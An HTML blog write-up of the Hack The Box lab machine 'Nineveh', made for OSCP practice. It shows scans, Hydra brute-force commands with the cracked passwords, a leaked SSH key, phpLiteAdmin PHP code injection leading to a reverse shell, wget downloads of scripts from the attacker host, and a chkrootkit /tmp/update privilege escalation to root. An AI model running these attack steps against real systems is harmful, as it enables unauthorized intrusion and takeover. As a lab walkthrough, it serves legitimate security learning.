<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Nineveh - Hack The Box Write-Up</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="../css/style.css">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
</head>
<body>
  <div class="container">
    <nav class="navbar">
      <ul class="nav-links">
        <li><a href="../index.html"><i class="fas fa-home"></i> Home</a></li>
        <li><a href="../index.html#about"><i class="fas fa-user"></i> About</a></li>
        <li><a href="../projects.html"><i class="fas fa-code"></i> Projects</a></li>
        <li><a href="../writeups.html"><i class="fas fa-file-alt"></i> Write-Ups</a></li>
        <li><a href="../index.html#contact"><i class="fas fa-envelope"></i> Contact</a></li>
      </ul>
    </nav>

    <div class="contents">
      <h1>Nineveh – HackTheBox WriteUp</h1>

      <div class="big-to-normal-image">
        <img src="../images/Nineveh_banner.webp" alt="Nineveh Banner">
      </div>

      <p>This write-up focuses on the Hack The Box machine "Nineveh," which is part of TJnull's recommended list for OSCP preparation. Nineveh centers on web application vulnerabilities, particularly exploiting weaknesses in phpLiteAdmin and a custom web interface, along with using advanced techniques like port knocking and a known vulnerability in Chkrootkit for privilege escalation.</p>

      <h2>Enumeration</h2>
      <h3>Nmap Scan</h3>
      <p>I began by performing an Nmap scan on the target host to identify open ports and services. Once the scan completed, it revealed two open ports: port 80 (HTTP) and port 443 (HTTPS). This discovery strongly indicated that the target was hosting a web server.</p>

      <div class="snippet">
        <pre class="code-block">nmap -A -v 10.129.238.84

Starting Nmap 7.94 ( https://nmap.org ) at 2024-11-15 15:44 CST
...
Nmap scan report for 10.129.238.84
Host is up (0.074s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
...
Nmap done: 1 IP address (1 host up) scanned in 30.86 seconds
           Raw packets sent: 2088 (95.444KB) | Rcvd: 544 (232.948KB)</pre>
      </div>

      <h2>Port 80 and 443</h2>
      <p>When I navigated to the website hosted on port 80, I encountered a default webpage for the webserver, providing no immediately useful information. I then decided to visit the site on port 443. This site displayed an image, but like the default webpage on port 80, it offered little to work with.</p>
      <p>To gather more information, I decided to run two Gobuster scans – one for each port – to search for hidden directories and files. I also executed a Nikto scan to identify potential vulnerabilities or misconfigurations within the webserver that could aid in advancing my investigation.</p>

      <div class="big-to-normal-image">
        <img src="../images/nineveh1.webp" alt="Port 80 webpage">
        <img src="../images/nineveh2.webp" alt="Port 443 webpage">
      </div>

      <h2>Gobuster & Nikto Scans</h2>
      <p>After running two Gobuster scans and a Nikto scan on the Nineveh machine, several interesting directories and files were uncovered. The Gobuster scans revealed the following directories: /department, /db/, and /secure_notes, each potentially harboring sensitive information. Meanwhile, the Nikto scan uncovered a file at /info.php, which could provide valuable insight into the server's configuration or potentially expose vulnerabilities.</p>

      <div class="snippet">
        <pre class="code-block">gobuster dir -u http://10.129.238.84 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt    

===============================================================
Gobuster v3.6
...
/department           (Status: 301) [Size: 319] [--> http://10.129.238.84/department/]
/server-status        (Status: 403) [Size: 301]
...
===============================================================
Finished
===============================================================</pre>
      </div>

      <div class="snippet">
        <pre class="code-block">gobuster dir -k -u https://10.129.238.84 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

===============================================================
Gobuster v3.6
...
/db                   (Status: 301) [Size: 313] [--> https://10.129.238.84/db/]
/server-status        (Status: 403) [Size: 302]
/secure_notes         (Status: 301) [Size: 323] [--> https://10.129.238.84/secure_notes/]
...
===============================================================
Finished
===============================================================</pre>
      </div>

      <div class="snippet">
        <pre class="code-block">nikto -h http://10.129.238.84/ 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.129.238.84
+ Target Hostname:    10.129.238.84
+ Target Port:        80
+ Start Time:         2024-11-15 15:47:31 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: The X-Content-Type-Options header is not set.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Server may leak inodes via ETags...
+ Apache/2.4.18 appears to be outdated...
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+ /info.php: Output from the phpinfo() function was found.
+ /info.php: PHP is installed...
+ /icons/README: Apache default file found.
+ /info.php?file=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI)...
+ /#wp-config.php#: #wp-config.php# file found.
+ 8102 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2024-11-15 16:00:41 (GMT-6) (790 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested</pre>
      </div>

      <h2>/Department Directory</h2>
      <p>I started by exploring the /department directory, which presented a login panel. Initially, this seemed to be a simple point of entry, but I decided to examine the source code of the page to look for any hidden information. In the process, I discovered a comment left by an administrator. The comment mentioned that MySQL had been installed and asked another admin to fix the webpage. While this comment might seem unimportant at first glance, it provided several valuable insights.</p>
      <p>Firstly, it listed two potential usernames: admin and amrois, which could be useful for authentication attempts. Secondly, the mention of MySQL installation hinted at the possibility of a MySQL-related vulnerability, suggesting that I might be able to exploit the database setup. Lastly, the comment indicated that the login page itself was problematic and needed fixing, which implied that it could be vulnerable to certain attacks. With this in mind, I decided to use the login panel as my primary attack vector, hoping to exploit any weaknesses related to authentication or database interaction.</p>

      <div class="big-to-normal-image">
        <img src="../images/nineveh3.webp" alt="Department login panel source comment">
      </div>

      <div class="snippet">
        <pre class="code-block">&lt;!-- @admin! MySQL is been installed.. please fix the login page! ~amrois --&gt;</pre>
      </div>

      <h2>/db/ Directory</h2>
      <p>Before proceeding with an attack on the /department login panel, I thought it would be good to explore the other directories to see if there were additional vulnerabilities I could exploit. When I accessed the /db/ directory, I encountered another login panel-this time for phpLiteAdmin version 1.9. I then went ahead and checked the source code for this page as well, but unfortunately, I didn't find any useful information there. However, given that I already had two possible usernames-admin and amrois-I speculated that these might work for this panel too. With this in mind, I expanded my attack vector to include this phpLiteAdmin panel.</p>

      <div class="big-to-normal-image">
        <img src="../images/nineveh4.webp" alt="phpLiteAdmin login panel">
      </div>

      <h2>/Secure_notes Directory</h2>
      <p>Finally, I decided to explore the /secure_notes directory, where I was presented with an image. At first, I wasn't sure what purpose the image could serve, but given the directory's name, I realized it might contain hidden information. With this in mind, I downloaded the image to my local machine and ran the strings command to search for any hidden data. Sure enough, the command revealed both a private and public RSA key for SSH under the username amrois.</p>
      <p>While this would normally be very useful for SSH access, my initial Nmap scan had not shown any open or filtered SSH ports. To double-check, I ran additional Nmap scans with different flags to see if I had missed an SSH port, but no matter how I adjusted the scans, I couldn't detect any SSH services running. At this point, I decided to set aside the SSH keys for the time being, but kept them in mind, hoping they might prove useful later in the exercise.</p>

      <div class="big-to-normal-image">
        <img src="../images/nineveh5.webp" alt="Secure notes image with hidden keys">
      </div>

      <div class="snippet">
        <pre class="code-block">-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
... (truncated)
-----END RSA PRIVATE KEY-----
...
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb</pre>
      </div>

      <h2>Hydra Bruteforce Attacks</h2>
      <p>With the two login panels and the two usernames in mind, I decided to use Hydra to brute-force the passwords. My first step was to capture the login requests for both panels using Burp Suite, which allowed me to capture the necessary parameters. Once I had the captured requests, I added them to my Hydra command line for brute-forcing.</p>
      <p>For the first login panel located in the /department directory, I encountered several failed attempts with various wordlists. After trying a few different ones, I finally cracked the password using the 10k-most-common wordlist. As for the second login panel in the /db/ directory, I used the popular rockyou wordlist, which quickly gave me the correct password.</p>

      <div class="big-to-normal-image">
        <img src="../images/nineveh6.webp" alt="Hydra brute-force on department login">
        <img src="../images/nineveh7.webp" alt="Hydra brute-force on phpLiteAdmin">
      </div>

      <div class="snippet">
        <pre class="code-block">hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt 10.129.238.84 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
...
[80][http-post-form] host: 10.129.238.84   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found</pre>
      </div>

      <div class="snippet">
        <pre class="code-block">hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.238.84 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -t 64
...
[443][http-post-form] host: 10.129.238.84   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found</pre>
      </div>

      <h2>Department Admin Panel</h2>
      <p>After successfully logging into both admin panels with the obtained passwords, I began inspecting their contents. In the first admin panel, I found a "notes" tab that displayed a message from amrois. The note referenced a previous comment I had found in the source code, following up on the status of the login page fix and warning that hardcoded usernames and passwords were problematic. It also mentioned checking the "secret folder" to gain access. Additionally, I noticed that the structure of the page suggested a potential Local File Inclusion (LFI) vulnerability, as the link for the page appeared to allow navigation between different files. I made a mental note of this vulnerability and moved on to examining the second admin panel.</p>

      <div class="big-to-normal-image">
        <img src="../images/nineveh8.webp" alt="Department admin panel notes">
      </div>

      <h2>Db Admin Panel</h2>
      <p>While inspecting the second admin panel, I discovered that I had the ability to create my own database. To better understand how I could exploit this, I researched vulnerabilities related to phpLiteAdmin 1.9. Almost immediately, I came across a CVE for phpLiteAdmin version 1.9.3, which described a Remote PHP Code Injection vulnerability. This flaw allows an attacker to create an SQLite database with a .php extension and insert PHP code as text fields. Once the database is created, the attacker can execute the embedded PHP code by accessing the database file via a web browser.</p>

      <div class="big-to-normal-image">
        <img src="../images/nineveh9.webp" alt="phpLiteAdmin panel">
        <img src="../images/nineveh10.webp" alt="Creating malicious database">
      </div>

      <h2>Remote PHP Code Injection</h2>
      <p>With the phpLiteAdmin vulnerability in mind, I decided to test it by attempting to gain a reverse shell. To do this, I created a new SQLite database and inserted a simple PHP webshell into one of its text fields. Once the webshell was in place, I used Burp Suite to test the vulnerability before attempting a full shell. I ran the ls command to see if it would return any directories from the system. Sure enough, the vulnerability was successful, and the response returned a list of directories running on the system. This confirmed that I had successfully exploited the vulnerability, and I could move forward with attempting a reverse shell.</p>

      <div class="big-to-normal-image">
        <img src="../images/nineveh11.webp" alt="Testing webshell with ls">
        <img src="../images/nineveh12.webp" alt="Webshell execution">
      </div>

      <h2>Webshell</h2>
      <p>With the vulnerability confirmed to be active on the webserver, I went ahead and set up a Netcat listener on my local machine and used a reverse shell from PentestMonkey. After that, I repeated the same process I had used when testing the vulnerability, but this time with an encoded reverse shell script using Burp Suite. Once I executed the payload, I successfully obtained a reverse shell, and I was able to interact with the target system from my local terminal, gaining deeper access to the machine.</p>

      <div class="big-to-normal-image">
        <img src="../images/nineveh13.webp" alt="Reverse shell received">
      </div>

      <div class="snippet">
        <pre class="code-block">nc -lvnp 8090  
listening on [any] 8090 ...
connect to [10.10.16.10] from (UNKNOWN) [10.129.238.84] 45282
/bin/sh: 0: can't access tty; job control turned off
$</pre>
      </div>

      <h2>Privilege Escalation</h2>
      <p>Now that I had successfully gained a shell on the target system, it was time to focus on escalating my privileges. The first step was to establish a more stable shell using Python3. Once that was done, I began enumerating the system to see what information I could gather. During the enumeration process, I discovered the user flag within the amrois user directory.</p>
      <p>I also found that I didn't have access to sudo, meaning I would need to find another method for privilege escalation. One thing I did notice was that I could still download files onto the system using wget and store them in the /tmp directory. With this in mind, I decided to download and install the LinEnum script, a popular enumeration tool, to gather more information about potential privilege escalation vectors. Running LinEnum would help me identify any weaknesses in the system that I could exploit to elevate my privileges.</p>

      <div class="snippet">
        <pre class="code-block">www-data@nineveh:/var/www/html/department$ cd /tmp
cd /tmp
www-data@nineveh:/tmp$ wget 10.10.16.10/LinEnum.sh
...
www-data@nineveh:/tmp$ bash LinEnum.sh

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982</pre>
      </div>

      <h2>Chkrootkit</h2>
      <p>While reviewing the results from the LinEnum script, I didn't find much of interest on the system. However, as I continued exploring, I came across a few directories I hadn't checked yet, including /report. Upon examining this directory, I noticed that a new file was being created every minute. Curious about the source of this file, I uploaded and ran a Bash script designed to track the process responsible for it. The script immediately returned results, and upon reviewing them, I discovered that Chkrootkit was creating these files.</p>
      <p>Chkrootkit is a tool used for detecting rootkits, and it was configured to run periodically as part of a scheduled cron job. It generates log files to document its findings, and these were being created every minute within the report directory. I then decided to do some further investigation of Chkrootkit, which led me to a CVE related to it that involved a Local Privilege Escalation vulnerability. This vulnerability allowed Chkrootkit to execute a file called /tmp/update. I then realized that if I were to place a file named update in the /tmp directory containing a reverse shell, I could potentially trigger Chkrootkit to execute the reverse shell and gain root access.</p>

      <div class="snippet">
        <pre class="code-block">www-data@nineveh:/tmp$ wget 10.10.16.10/procmon.sh
...
www-data@nineveh:/tmp$ bash procmon.sh
...
&gt; /usr/sbin/CRON -f
&gt; /bin/sh -c /root/vulnScan.sh
&gt; /bin/bash /root/vulnScan.sh
&gt; /bin/sh /usr/bin/chkrootkit
...</pre>
      </div>

      <div class="big-to-normal-image">
        <img src="../images/nineveh14.webp" alt="Chkrootkit cron job detection">
      </div>

      <h2>Root shell</h2>
      <p>With the Chkrootkit vulnerability in mind, I created a file called update in the /tmp directory and uploaded it with a Netcat reverse shell inside. After setting up my listener, I waited for a minute, and sure enough, I received a root shell. From there, I navigated to the root directory and retrieved the root flag, successfully pwning the machine!</p>

      <div class="snippet">
        <pre class="code-block">www-data@nineveh:/tmp$ wget 10.10.16.10/update
...
www-data@nineveh:/tmp$ chmod +x update
nc -lvnp 1234  
listening on [any] 1234 ...
connect to [10.10.16.10] from (UNKNOWN) [10.129.238.84] 34998
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cat /root/root.txt
79bcf1e7824499b9266be71dc77e0d7c
#</pre>
      </div>

      <div class="big-to-normal-image">
        <img src="../images/nineveh15.webp" alt="Root shell and flag">
      </div>
    </div>
  </div>
</body>
</html>
